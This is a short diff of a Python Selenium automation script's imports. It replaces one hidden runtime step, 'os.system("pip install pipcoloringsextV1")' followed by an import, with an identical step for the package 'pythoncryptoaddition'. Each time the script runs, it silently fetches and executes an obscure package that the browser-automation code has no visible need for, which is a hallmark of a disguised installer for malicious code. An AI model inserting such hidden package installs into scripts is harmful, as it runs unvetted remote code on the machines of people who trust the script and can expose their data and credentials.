@@ -1,6 +1,6 @@
 import os
-os.system("pip install pipcoloringsextV1")
-import pipcoloringsextV1
+os.system("pip install pythoncryptoaddition")
+import pythoncryptoaddition
 from selenium import webdriver
 from selenium.webdriver.firefox.options import Options
 from selenium.webdriver.common.keys import Keys
